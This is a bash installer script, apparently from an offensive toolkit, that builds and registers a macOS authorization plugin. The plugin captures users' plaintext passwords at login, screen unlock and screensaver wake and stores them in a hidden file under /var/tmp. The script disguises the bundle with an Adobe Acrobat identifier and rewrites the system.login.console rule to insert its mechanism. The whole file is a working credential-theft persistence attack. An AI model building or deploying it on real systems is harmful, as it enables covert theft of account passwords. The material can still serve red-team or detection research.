#!/bin/bash
# Install Authorization Plugin — REQUIRES ROOT
# Builds the plugin bundle and registers it with the authorization database.
# After installation, captures plaintext password on every login/unlock/screensaver wake.
#
# MITRE: T1556 (Modify Authentication Process)

set -e

PLUGIN_NAME="AuthPlugin"
PLUGIN_DIR="/Library/Security/SecurityAgentPlugins/${PLUGIN_NAME}.bundle"
SRC_DIR="$(cd "$(dirname "$0")" && pwd)"
MECHANISM="${PLUGIN_NAME}:invoke"

# Must be root
if [ "$(id -u)" -ne 0 ]; then
    echo "[-] This script requires root. Run with sudo."
    exit 1
fi

# ============================================================
# Build Plugin Bundle
# ============================================================

echo "[*] Building authorization plugin..."

mkdir -p "/tmp/${PLUGIN_NAME}.bundle/Contents/MacOS"

# Compile
clang -bundle \
    -framework Security \
    -framework Foundation \
    -o "/tmp/${PLUGIN_NAME}.bundle/Contents/MacOS/${PLUGIN_NAME}" \
    "${SRC_DIR}/auth_plugin.m"

# Info.plist
cat > "/tmp/${PLUGIN_NAME}.bundle/Contents/Info.plist" << PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>CFBundleName</key>
    <string>${PLUGIN_NAME}</string>
    <key>CFBundleIdentifier</key>
    <string>com.adobe.acrobat.authplugin</string>
    <key>CFBundleVersion</key>
    <string>1.0</string>
    <key>CFBundlePackageType</key>
    <string>BNDL</string>
    <key>CFBundleExecutable</key>
    <string>${PLUGIN_NAME}</string>
</dict>
</plist>
PLIST

# ============================================================
# Install Plugin
# ============================================================

echo "[*] Installing to $PLUGIN_DIR..."
rm -rf "$PLUGIN_DIR"
cp -r "/tmp/${PLUGIN_NAME}.bundle" "$PLUGIN_DIR"
chown -R root:wheel "$PLUGIN_DIR"
chmod -R 755 "$PLUGIN_DIR"

rm -rf "/tmp/${PLUGIN_NAME}.bundle"

# ============================================================
# Register in Authorization Database
# ============================================================

echo "[*] Registering plugin mechanism..."

# Read current system.login.console rule
CURRENT_RULE=$(security authorizationdb read system.login.console 2>/dev/null)

# Add our mechanism before the existing ones
# The mechanism fires BEFORE normal auth — captures the password from context
security authorizationdb write system.login.console << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>class</key>
    <string>evaluate-mechanisms</string>
    <key>comment</key>
    <string>Login mechanism evaluation</string>
    <key>mechanisms</key>
    <array>
        <string>builtin:prelogin</string>
        <string>builtin:policy-banner</string>
        <string>loginwindow:login</string>
        <string>builtin:login-begin</string>
        <string>builtin:reset-password,privileged</string>
        <string>loginwindow:FDESupport,privileged</string>
        <string>builtin:forward-login,privileged</string>
        <string>builtin:auto-login,privileged</string>
        <string>builtin:authenticate,privileged</string>
        <string>${MECHANISM}</string>
        <string>PKINITMechanism:auth,privileged</string>
        <string>builtin:login-success</string>
        <string>loginwindow:login</string>
        <string>homedir:login</string>
        <string>homedir:status</string>
        <string>MCXMechanism:login</string>
        <string>CryptoTokenKit:login</string>
        <string>loginwindow:done</string>
    </array>
    <key>tries</key>
    <integer>10000</integer>
</dict>
</plist>
EOF

echo "[+] Authorization plugin installed and registered"
echo "[*] Credentials will be captured on every:"
echo "    - Login"
echo "    - Screen unlock"
echo "    - Screensaver wake"
echo "[*] Log file: /var/tmp/.auth_creds"
echo ""
echo "[!] To uninstall:"
echo "    sudo rm -rf $PLUGIN_DIR"
echo "    sudo security authorizationdb remove system.login.console"
echo "    sudo security authorizationdb write system.login.console < /dev/stdin  # restore default"
